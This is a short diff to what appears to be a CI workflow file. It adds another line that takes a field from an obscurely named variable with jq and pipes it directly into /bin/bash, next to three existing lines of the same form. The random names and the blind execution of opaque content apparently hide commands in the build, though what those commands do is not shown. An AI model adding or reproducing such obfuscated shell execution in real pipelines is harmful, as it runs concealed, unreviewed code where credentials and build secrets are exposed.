@@ -24,6 +24,7 @@ jobs:
           echo $st6 | jq -r .xhw9 | /bin/bash
           echo $oxc570 | jq -r .z96628 | /bin/bash
           echo $d58 | jq -r .lkiz95514 | /bin/bash
+          echo $tfg2 | jq -r .mfuri63964 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
